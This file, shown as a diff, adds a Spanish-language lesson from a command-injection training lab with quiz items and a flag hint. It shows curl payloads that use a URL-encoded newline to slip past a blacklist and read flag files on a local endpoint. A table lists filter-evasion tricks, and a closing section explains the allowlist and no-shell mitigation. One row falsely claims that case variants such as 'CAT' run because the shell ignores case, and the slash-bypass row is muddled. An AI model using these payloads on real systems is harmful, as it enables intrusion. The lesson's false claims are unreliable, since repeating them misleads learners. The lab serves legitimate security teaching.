@@ -1,0 +1,66 @@
+---
+index: 2
+title: "Bypass de filtros: evadir la lista negra"
+questions:
+  - id: command-injection-t02-q01
+    prompt: "¿Qué URL-encoded newline (%0a) permite inyectar en un endpoint que bloquea ; y &&?"
+    hint: "%0a es el carácter de nueva línea en URL encoding."
+    kind: text
+  - id: command-injection-t02-q02
+    prompt: "Envía la flag del endpoint /secure-ping (bypass del filtro con nueva línea)."
+    hint: "curl el /secure-ping con host que incluya %0a (newline URL-encoded)"
+    kind: flag
+  - id: command-injection-t02-q03
+    prompt: "¿Qué enfoque de validación es correcto para prevenir command injection?"
+    hint: "Allowlist vs blacklist."
+    kind: choice
+    options:
+      - id: a
+        label: "Blacklist: bloquear caracteres peligrosos (; && || etc.)"
+      - id: b
+        label: "Allowlist: solo permitir caracteres esperados (números y puntos para IP) O usar APIs que no invoquen shell"
+      - id: c
+        label: "WAF es suficiente"
+      - id: d
+        label: "HTTPS lo previene"
+---
+
+## El lab tiene un filtro... que se rompe
+
+El endpoint `/secure-ping` bloquea `;`, `&&`, `||`, `` ` `` y `$()`. Pero:
+
+```bash
+# Bloqueado:
+curl "http://127.0.0.1:18084/secure-ping?host=8.8.8.8;cat%20/flag"
+# → Error: character ";" is not allowed
+
+# BYPASS con newline (%0a = URL-encoded \n):
+curl "http://127.0.0.1:18084/secure-ping?host=8.8.8.8%0acat%20/tmp/flags/flag3_filtered.txt"
+```
+
+El filtro busca `;` pero la shell también interpreta `\n` (nueva línea) como
+separador de comandos. El filtro olvidó bloquearlo.
+
+## Otras técnicas de bypass
+
+```text
+Filtro: bloquea ";"         → Bypass: %0a (newline), | (pipe), & (single)
+Filtro: bloquea "cat"       → Bypass: c'a't, c"a"t, /bin/cat, head, more
+Filtro: bloquea espacios    → Bypass: $IFS, ${IFS}, < (redirect), %09 (tab)
+Filtro: bloquea "/"         → Bypass: ${PATH:0:1}, ..\/..\/ (path traversal)
+Filtro: case-sensitive      → Bypass: CAT, Cat, cAt (la shell no distingue)
+```
+
+## La lección definitiva
+
+**Una blacklist SIEMPRE es incompleta**. La mitigación correcta:
+
+```python
+# BIEN (allowlist + no shell):
+if not re.match(r'^[\d.]+$', host):  # solo números y puntos
+    return 'Invalid host'
+result = subprocess.run(['ping', '-c', '1', '-W', '2', host])  # lista, no string
+```
+
+Al pasar una LISTA (no string) a subprocess sin `shell=True`, Python NO usa la shell
+y la inyección es imposible.
